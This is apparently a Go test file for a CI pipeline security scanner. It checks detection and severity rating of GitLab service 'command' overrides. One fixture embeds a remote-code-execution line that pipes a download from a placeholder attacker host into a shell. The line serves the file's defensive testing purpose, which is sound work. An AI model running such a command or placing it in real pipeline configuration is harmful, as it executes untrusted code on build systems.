package analyze

import "testing"

func TestDetectServiceCommandInjection(t *testing.T) {
	tests := []severityTestCase{
		{
			name: "service with command override - MR triggered - HIGH",
			yaml: `
build:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
  services:
    - name: postgres:14
      command: ["/bin/sh", "-c", "curl http://attacker.com | sh"]
  script:
    - echo "building"
`,
			wantFound: true,
			wantHigh:  true,
		},
		{
			name: "service with command - push triggered - MEDIUM",
			yaml: `
test:
  services:
    - name: redis:7
      command: ["redis-server", "--requirepass", "test"]
  script:
    - echo "testing"
`,
			wantFound: true,
			wantHigh:  false,
		},
		{
			name: "service without command - no finding",
			yaml: `
test:
  services:
    - name: postgres:14
  script:
    - echo "testing"
`,
			wantFound: false,
		},
	}

	runSeverityDetectionTests(t, tests, ServiceCommandInjectionID, detectServiceCommandInjection)
}
